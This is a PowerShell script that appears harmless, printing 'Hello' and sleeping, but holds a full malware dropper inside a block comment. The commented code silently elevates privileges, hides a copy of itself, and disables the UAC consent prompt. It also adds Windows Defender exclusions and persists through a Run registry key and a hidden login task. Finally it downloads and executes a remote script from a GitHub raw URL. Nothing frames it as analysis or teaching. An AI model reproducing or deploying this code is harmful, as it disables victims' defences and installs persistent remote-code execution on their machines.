Write-Output "Hello"
Start-Sleep -Seconds 60
<## Attempt to elevate to administrative privileges if not already admin
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isAdmin) {
    try {
        # Relaunch the script with elevated privileges
        Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$($MyInvocation.MyCommand.Path)`"" -Verb RunAs -ErrorAction Stop
        exit 0
    }
    catch {
        # Continue execution without admin privileges
    }
}

# Get the path of the current script
$originalScriptPath = $MyInvocation.MyCommand.Path
$scriptName = [System.IO.Path]::GetFileName($originalScriptPath)
$hiddenDir = "C:\ProgramData\SystemConfig"
$hiddenScriptPath = Join-Path -Path $hiddenDir -ChildPath $scriptName
$logDir = "C:\ProgramData\SystemConfig\Logs" # For Defender exclusion, in case it exists

# Retry configuration for all operations
$maxRetries = 5
$baseDelay = 1000 # Initial delay in milliseconds (1 second)
$maxDelay = 30000 # Maximum delay in milliseconds (30 seconds)

# --- Create Hidden Directory and Copy Script ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        if (-not (Test-Path -Path $hiddenDir)) {
            New-Item -Path $hiddenDir -ItemType Directory -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path $hiddenDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
        }
        if (-not (Test-Path -Path $hiddenScriptPath)) {
            Copy-Item -Path $originalScriptPath -Destination $hiddenScriptPath -ErrorAction Stop | Out-Null
            Set-ItemProperty -Path $hiddenScriptPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction Stop
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Disable UAC Prompt ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $uacRegistryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
        $uacRegistryName = "ConsentPromptBehaviorAdmin"
        $uacValue = 0 # 0 = Elevate without prompting
        if ((Get-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -ErrorAction SilentlyContinue).$uacRegistryName -ne $uacValue) {
            Set-ItemProperty -Path $uacRegistryPath -Name $uacRegistryName -Value $uacValue -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Add to Windows Defender Exclusions ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $exclusions = Get-MpPreference -ErrorAction SilentlyContinue | Select-Object -ExpandProperty ExclusionPath
        if ($exclusions -notcontains $hiddenScriptPath) {
            Add-MpPreference -ExclusionPath $hiddenScriptPath -ErrorAction Stop | Out-Null
        }
        if ($exclusions -notcontains $hiddenDir) {
            Add-MpPreference -ExclusionPath $hiddenDir -ErrorAction Stop | Out-Null
        }
        if ($exclusions -notcontains $logDir) {
            Add-MpPreference -ExclusionPath $logDir -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Add to Registry Startup for All Users ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $registryPath = "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        $registryName = [System.IO.Path]::GetFileNameWithoutExtension($scriptName)
        $registryValue = "powershell.exe -ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
        if (-not (Get-ItemProperty -Path $registryPath -Name $registryName -ErrorAction SilentlyContinue)) {
            New-ItemProperty -Path $registryPath -Name $registryName -Value $registryValue -PropertyType String -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Create Scheduled Task to Run at Login ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $taskName = $registryName
        $taskDescription = "Runs the $registryName PowerShell script at user login."
        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-ExecutionPolicy Bypass -File `"$hiddenScriptPath`" -WindowStyle Hidden"
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $principal = New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -Hidden
        if (-not (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue)) {
            Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -Description $taskDescription -ErrorAction Stop | Out-Null
        }
        $success = $true
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
}

# --- Download and Execute External Script with Advanced Retry ---
$retryCount = 0
$success = $false
while (-not $success -and $retryCount -lt $maxRetries) {
    try {
        $url = "https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/getexe.ps1"
        $webClient = New-Object System.Net.WebClient
        $scriptContent = $webClient.DownloadString($url)
        $success = $true
        # Execute the downloaded script
        Invoke-Expression $scriptContent -ErrorAction Stop
    }
    catch {
        $retryCount++
        if ($retryCount -eq $maxRetries) {
            break
        }
        $delay = [math]::Min($baseDelay * [math]::Pow(2, $retryCount), $maxDelay)
        $jitter = Get-Random -Minimum 0 -Maximum 100
        Start-Sleep -Milliseconds ($delay + $jitter)
    }
    finally {
        if ($webClient) { $webClient.Dispose() }
    }
}
#>
